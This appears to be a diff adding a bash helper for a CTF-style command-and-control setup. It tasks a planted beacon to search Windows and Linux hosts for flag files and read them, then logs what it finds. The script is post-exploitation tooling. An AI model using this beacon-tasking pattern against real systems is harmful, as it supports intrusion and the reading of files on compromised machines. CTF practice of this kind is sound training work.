@@ -1,0 +1,44 @@
+#!/bin/bash
+# c2-flag - Find and capture flags from target (Windows + Linux)
+# Usage: c2-flag [beacon_id]
+C2="$(dirname "$0")/c2"
+BEACON="${1:-}"
+
+if [ -n "$BEACON" ]; then
+    $C2 use "$BEACON" >/dev/null 2>&1
+fi
+
+FLAGS_FILE="$(dirname "$0")/flags.md"
+
+echo "============================================"
+echo "  FLAG CAPTURE"
+echo "============================================"
+
+# Try Windows first (no-op harmlessly on Linux)
+echo "[*] Windows flag locations..."
+$C2 task "dir C:\\Users\\*\\Desktop\\flag.txt /s"
+$C2 task "dir C:\\Users\\*\\flag.txt /s"
+$C2 task "dir C:\\flag.txt /s"
+$C2 task "dir C:\\root\\Desktop\\flag.txt 2>nul"
+$C2 task "dir C:\\Users\\Administrator\\Desktop\\flag.txt"
+
+echo "[*] Windows flag patterns..."
+$C2 task "findstr /si /m \"{HTB\" C:\\Users\\*.* 2>nul"
+$C2 task "findstr /si /m \"{FLAG\" C:\\Users\\*.* 2>nul"
+
+# Linux paths
+echo "[*] Linux flag locations..."
+$C2 task "find /home /root /opt /tmp /var -name '*flag*' -type f 2>/dev/null | head -20"
+$C2 task "find / -maxdepth 4 -name 'flag.txt' -o -name 'flag' -o -name 'root.txt' -o -name 'user.txt' 2>/dev/null | head -20"
+$C2 task "cat /flag* 2>/dev/null; cat /root/flag* 2>/dev/null; cat /home/*/flag* 2>/dev/null"
+$C2 task "cat /root/root.txt /home/*/user.txt 2>/dev/null"
+
+echo ""
+echo "[*] Waiting 90s for results..."
+$C2 wait 90
+
+echo ""
+echo "[*] When flag found, add to $FLAGS_FILE:"
+echo "    echo '| # | FLAG | Location | Method |' >> $FLAGS_FILE"
+echo "    echo '|---|------|----------|--------|' >> $FLAGS_FILE"
+echo "    echo '| N | FLAG{...} | path | method |' >> $FLAGS_FILE"
